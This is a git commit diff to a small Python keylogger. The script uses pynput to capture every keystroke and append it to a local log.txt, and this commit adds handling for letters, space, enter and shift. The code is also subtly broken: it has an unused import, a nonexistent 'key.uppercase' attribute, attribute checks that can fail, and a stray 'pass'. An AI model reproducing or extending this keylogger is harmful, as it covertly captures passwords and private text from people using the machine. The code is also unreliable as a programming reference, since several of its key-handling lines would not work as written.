fd34480b06612dc5f7ceb5c04b8a12e61b3430b9
bianca <biancagutierrez121212@gmail.com>
2025-08-19 22:02:03 -0500

    Change to open txt file

--- KeyLogger/KeyLogger.py
+++ KeyLogger/KeyLogger.py
@@ -8,6 +8,7 @@
 #--------------------------------------------#
 
 #import pynput to monitor keystrokes
+from os import write
 from pynput.keyboard import Listener
 
 #Defining write to a file by the press of a key
@@ -15,12 +16,26 @@ def writetofile(key):
 
     #assigns keydata with the string key
     keydata = str(key)
+
     #open the log txt file and appends new data to file
     with open("log.txt", "a") as f:
-        f.write(keydata)
+        if hasattr(key, "char"):
+            #this will write normal letters and numbers
+            f.write(key.char)
+
+        #if space key is pressed then log a space
+        elif (key == key.space):
+                f.write(" ")
+        #if enter key is pressed create a new line in txt file
+        elif (key == key.enter):
+            f.write("\n");
+
+        elif (key == key.shift):
+            f.write(key.uppercase)
+
+        pass
+  
 
 #listen monitors key input and joins
 with Listener(writetofile) as l:
     l.join()
-    
-    
